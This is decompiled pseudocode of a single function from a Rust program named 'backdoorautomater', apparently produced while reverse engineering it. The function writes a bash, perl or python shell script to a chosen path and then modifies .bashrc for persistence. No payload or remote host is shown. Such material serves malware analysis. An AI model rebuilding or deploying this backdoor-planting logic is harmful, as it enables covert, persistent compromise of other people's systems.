__int64 __fastcall backdoorautomater::shellscript::create_script(
        __int128 *a1,
        __int128 *a2,
        __int128 *a3,
        __int128 *a4,
        unsigned __int8 a5)
{
  __int64 v8; // rcx
  int v9; // eax
  __int64 v10; // rax
  char v11; // bl
  __int64 v12; // rax
  __int64 result; // rax
  __int128 v14; // [rsp+10h] [rbp-E8h] BYREF
  __int128 *v15; // [rsp+20h] [rbp-D8h]
  __int128 v16; // [rsp+28h] [rbp-D0h]
  __int64 v17; // [rsp+38h] [rbp-C0h]
  __int128 v18; // [rsp+40h] [rbp-B8h] BYREF
  __int128 *v19; // [rsp+50h] [rbp-A8h]
  __int128 v20; // [rsp+60h] [rbp-98h] BYREF
  __int128 *v21; // [rsp+70h] [rbp-88h]
  __int128 v22; // [rsp+80h] [rbp-78h] BYREF
  __int64 v23; // [rsp+90h] [rbp-68h]
  __int128 v24; // [rsp+98h] [rbp-60h] BYREF
  __int128 *v25; // [rsp+A8h] [rbp-50h]
  _BYTE v26[72]; // [rsp+B0h] [rbp-48h] BYREF

  v8 = *((_QWORD *)a3 + 1) + *((_QWORD *)a3 + 2);
  *(_QWORD *)&v14 = *((_QWORD *)a3 + 1);
  *((_QWORD *)&v14 + 1) = v8;
  v9 = <core::str::iter::Chars as core::iter::traits::double_ended::DoubleEndedIterator>::next_back(&v14);
  if ( v9 != 1114112 && v9 != 47 )
    alloc::string::String::push(a3);
  v15 = (__int128 *)*((_QWORD *)a3 + 2);
  v14 = *a3;
  v16 = *a4;
  v17 = *((_QWORD *)a4 + 2);
  alloc::str::join_generic_copy(&v18, &v14, 2LL, 1LL, 0LL);
  v21 = v19;
  v20 = v18;
  core::ptr::drop_in_place<[alloc::string::String; 2]>(&v14);
  <alloc::string::String as core::clone::Clone>::clone(v26, a2);
  <alloc::string::String as core::clone::Clone>::clone(&v24, &v20);
  switch ( a5 )
  {
    case 3u:
      v23 = *((_QWORD *)a2 + 2);
      v22 = *a2;
      v19 = (__int128 *)*((_QWORD *)a1 + 2);
      v18 = *a1;
      v15 = v21;
      v14 = v20;
      v10 = backdoorautomater::shellscript::write_shell_bash((__int64)&v22, (__int64)&v18, (__int64)&v14);
      goto LABEL_10;
    case 2u:
      v23 = *((_QWORD *)a2 + 2);
      v22 = *a2;
      v19 = (__int128 *)*((_QWORD *)a1 + 2);
      v18 = *a1;
      v15 = v21;
      v14 = v20;
      v10 = backdoorautomater::shellscript::write_shell_perl((__int64)&v22, (__int64)&v18, (__int64)&v14);
      goto LABEL_10;
    case 1u:
      v23 = *((_QWORD *)a2 + 2);
      v22 = *a2;
      v19 = (__int128 *)*((_QWORD *)a1 + 2);
      v18 = *a1;
      v15 = v21;
      v14 = v20;
      v10 = backdoorautomater::shellscript::write_shell_pyfile((__int64)&v22, (__int64)&v18, (__int64)&v14);
LABEL_10:
      backdoorautomater::sanitizer::sanitize_return_fn(v10);
      v11 = 1;
      goto LABEL_12;
  }
  v11 = 0;
LABEL_12:
  v15 = v25;
  v14 = v24;
  v12 = backdoorautomater::shellscript::modify_bashrc((__int64)&v14, a5);
  backdoorautomater::sanitizer::sanitize_return_fn(v12);
  *(_QWORD *)&v14 = &off_22A7E8;
  *((_QWORD *)&v14 + 1) = 1LL;
  v15 = (_OWORD *)&byte_8;
  v16 = 0LL;
  std::io::stdio::_print(&v14);
  *(_QWORD *)&v22 = v26;
  *(_QWORD *)&v18 = &v22;
  *((_QWORD *)&v18 + 1) = <&T as core::fmt::Display>::fmt;
  *(_QWORD *)&v14 = &off_22A7F8;
  *((_QWORD *)&v14 + 1) = 2LL;
  v15 = &v18;
  v16 = 1uLL;
  std::io::stdio::_print(&v14);
  result = core::ptr::drop_in_place<alloc::string::String>(v26);
  if ( !v11 )
  {
    core::ptr::drop_in_place<alloc::string::String>(&v20);
    core::ptr::drop_in_place<alloc::string::String>(a2);
    return core::ptr::drop_in_place<alloc::string::String>(a1);
  }
  return result;
}